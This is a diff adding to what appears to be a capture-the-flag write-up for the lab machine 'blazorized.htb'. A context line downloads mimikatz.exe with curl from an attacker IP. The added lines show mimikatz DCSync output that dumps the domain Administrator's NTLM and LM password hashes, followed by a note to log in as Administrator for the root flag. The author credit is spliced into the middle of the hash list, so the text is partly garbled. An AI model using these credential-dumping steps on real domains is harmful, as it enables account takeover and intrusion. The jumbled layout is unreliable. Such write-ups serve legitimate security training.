@@ -308,5 +308,45 @@ curl 10.10.14.54:80/mimikatz.exe -o mimikatz.exe
 
 --------------------------------------------------------------------------------------------------------------------------------------
 
-
+mimikatz # lsadump::dcsync /domain:blazorized.htb /user:Administrator
+[DC] 'blazorized.htb' will be the domain
+[DC] 'DC1.blazorized.htb' will be the DC server
+[DC] 'Administrator' will be the user account
+Object RDN : Administrator
+** SAM ACCOUNT **
+SAM Username : Administrator
+Account Type : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration :
+Password last change : 2/25/2024 12:54:43 PM
+Object Security ID : S-1-5-21-2039403211-964143010-2924010611-500
+Object Relative ID : 500
+Credentials:
+Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3
+ntlm- 0: f55ed1465179ba374ec1cad05b34a5f3
+ntlm- 1: eecc741ecf81836dcd6128f5c93313f2
+ntlm- 2: c543bf260df887c25dd5fbacff7dcfb3
+ntlm- 3: c6e7b0a59bf74718bce79c23708a24ff
+ntlm- 4: fe57c7727f7c2549dd886159dff0d88a
+ntlm- 5: b471c416c10615448c82a2cbb731efcb
+ntlm- 6: b471c416c10615448c82a2cbb731efcb
+ntlm- 7: aec132eaeee536a173e40572e8aad961
+ntlm- 8: f83afb01d9b44ab9842d9c70d8d2440a
+ntlm- 9: bdaffbfe64f1fc646a3353be1c2c3c99
+lm - 0: ad37753b9f78b6b98ec3bb65e5995c73
+lm - 1: c449777ea9b0cd7e6b96dd8c780c98f0
+Access as Administrator and get root flag.
+PWNNET TEAM
+writted by 3ky
+lm - 2: ebbe34c80ab8762fa51e04bc1cd0e426
+lm - 3: 471ac07583666ccff8700529021e4c9f
+lm - 4: ab4d5d93532cf6ad37a3f0247db1162f
+lm - 5: ece3bdafb6211176312c1db3d723ede8
+lm - 6: 1ccc6a1cd3c3e26da901a8946e79a3a5
+lm - 7: 8b3c1950099a9d59693858c00f43edaf
+lm - 8: a14ac624559928405ef99077ecb497ba
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+Random Value : 36ff197ab8f852956e4dcbbe85e38e17
 ```
+
